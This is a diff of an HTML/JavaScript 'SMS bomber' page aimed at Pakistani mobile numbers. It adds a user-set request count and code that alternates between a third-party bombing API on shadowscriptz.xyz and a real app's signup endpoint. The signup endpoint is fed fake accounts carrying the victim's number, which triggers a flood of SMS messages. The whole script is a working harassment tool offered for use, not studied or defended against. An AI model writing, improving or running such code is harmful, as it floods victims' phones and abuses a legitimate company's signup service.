@@ -44,8 +44,6 @@
       font-size: 13px;
       margin-top: 10px;
     }
-
-    /* Custom popup */
     .popup {
       position: fixed;
       top: 40%;
@@ -66,8 +64,8 @@
     <h1 class="title">Lite<br>Boomber</h1>
 
     <div class="box">
-      <input type="text" id="number" placeholder="Enter Mobile e.g. 030000XXXXX" />
-      <br><br>
+      <input type="text" id="number" placeholder="Enter Mobile e.g. 030000XXXXX" /><br><br>
+      <input type="number" id="count" placeholder="How many times? (e.g. 50)" /><br><br>
       <button onclick="startBombing()">Bomb 💣</button>
       <p class="hint">Enter number like: 030000XXXXX</p>
     </div>
@@ -79,52 +77,55 @@
     </div>
   </div>
 
-  <!-- Contact Section -->
-  <div style="background-color: #1f1f24; color: white; padding: 20px; border-radius: 16px; width: fit-content; margin: 40px auto; text-align: center;">
-    <h3 style="font-weight: bold;">Contact Us</h3>
-    <p>
-      <a href="https://wa.me/447354208303?text=hello%20🤗" style="color: white; text-decoration: none;">
-        📞 +44 7354 208303<br>(WhatsApp)
-      </a>
-    </p>
-    <p>
-      📧 <a href="mailto:alijanhunyaar@gmail.com" style="color: white; text-decoration: none;">alijanhunyaar@gmail.com</a>
-    </p>
-  </div>
-
-  <p style="text-align: center; color: gray; margin-top: 20px;">
-    © 2025 RAZA. All rights reserved.
-  </p>
-
   <script>
     function showPopup(message) {
       const popup = document.createElement('div');
       popup.classList.add('popup');
       popup.innerText = message;
       document.body.appendChild(popup);
-      setTimeout(() => popup.remove(), 2000); // 2 second popup
+      setTimeout(() => popup.remove(), 2000);
     }
 
-    function startBombing() {
-      const number = document.getElementById('number').value.trim();
-      if (!number || number.length < 10) {
-        showPopup("⚠️ Please enter a valid number");
+    async function startBombing() {
+      const numberInput = document.getElementById('number').value.trim();
+      const count = parseInt(document.getElementById('count').value);
+
+      if (!numberInput || numberInput.length < 10 || isNaN(count) || count < 1) {
+        showPopup("⚠️ Enter valid number & amount");
         return;
       }
 
-      const fullNumber = number.startsWith("92") ? number : "92" + number.slice(1);
+      const number = numberInput.startsWith("92") ? numberInput : "92" + numberInput.slice(1);
+      showPopup(`🔥 Sending ${count} bombing requests...`);
 
-      // 🔁 Send 50 background requests
-      for (let i = 1; i <= 50; i++) {
-        fetch(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${fullNumber}`)
-          .then(res => {
-            if (!res.ok) console.warn(`Request ${i} failed`);
+      for (let i = 1; i <= count; i++) {
+        // Alternate between both APIs
+        if (i % 2 === 0) {
+          fetch(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`)
+            .then(res => console.log(`[#${i}] shadowscriptz: ${res.status}`))
+            .catch(() => console.warn(`[#${i}] Error on shadowscriptz`));
+        } else {
+          fetch("https://prod.fitflexapp.com/api/users/signupV1", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              email: `test${i}@gmail.com`,
+              mobile: number,
+              password: "Test1234",
+              name: "Test User"
+            })
           })
-          .catch(() => console.error(`Request ${i} error`));
+            .then(res => console.log(`[#${i}] fitflex: ${res.status}`))
+            .catch(() => console.warn(`[#${i}] Error on fitflex`));
+        }
+
+        // Optional delay to avoid overload (remove if not needed)
+        await new Promise(res => setTimeout(res, 100));
       }
 
-      // Show instant confirmation popup
-      showPopup("🔥 Bombing request sent x50!");
+      showPopup("✅ Bombing Completed!");
     }
   </script>
 </body>
